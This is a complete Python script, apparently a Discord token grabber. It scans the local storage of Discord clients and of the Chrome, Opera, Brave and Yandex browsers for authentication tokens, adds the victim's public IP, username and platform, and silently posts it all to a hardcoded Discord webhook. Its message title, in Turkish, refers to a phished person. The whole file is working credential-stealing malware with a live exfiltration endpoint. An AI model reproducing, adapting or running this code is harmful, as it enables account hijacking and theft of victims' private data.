import os
import sys
import re
import json
import tkinter as tk
from urllib.request import Request, urlopen
from requests import get

# your webhook URL
datas = {}
WEBHOOK_URL = 'https://discord.com/api/webhooks/988838717890367518/nUT3qRfdIwhIElQHEX4MPIcTPNYXboXxu1UvdYAOqxEe34DpTDqCCT0EgGeQlu00Kwhi'

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

discordPaths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}

paths = {
    'Microsoft Startup': roaming + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
}

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def make_todos():
    datas["Ip"] = get('https://api.ipify.org/').text
    datas["User"] = os.getlogin()
    datas["pcPlatform"] = sys.platform
    message = ''
    for platform, path in discordPaths.items():
        if not os.path.exists(path):
            continue

        message += f'**{platform}**\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n\n'
        else:
            message += 'No tokens found.\n'
            
        datas["discordTokens"] = message
    

def main():
    make_todos()
        
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    
    fields = []
    
    for index, val in enumerate(datas, start=0):
        fields.append({
            'name': '**' + val + '**',
            'value': datas[val],
            'inline': False
        })

    payload = json.dumps({
        'embeds': [
            {
                'title': 'Oltalanan bir kişi bilgisayarını yeniden başlattı.',
                'fields': fields
            }
        ]
    })

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
        

if __name__ == '__main__':
    main()